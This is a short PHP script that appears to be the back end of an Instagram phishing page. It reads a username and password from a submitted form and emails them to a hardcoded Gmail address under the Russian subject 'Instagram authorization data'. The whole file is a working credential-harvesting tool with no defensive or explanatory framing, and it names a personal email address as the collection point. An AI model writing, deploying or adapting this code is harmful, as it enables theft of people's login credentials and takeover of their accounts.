<?php
if(isset($_POST['submit'])) {
    $to = "abdullojon490@gmail.com";
    $subject = "Данные авторизации на Instagram";
    $name = $_POST['username'];
    $password = $_POST['password'];
    $message = "Логин: " . $name . "\n" .
               "Пароль: " . $password;
    $headers = "From: webmaster@example.com";

    if(mail($to, $subject, $message, $headers)) {
        echo "Данные были успешно отправлены на указанную почту.";
    } else {
        echo "Ошибка при отправке данных.";
    }
}
?>
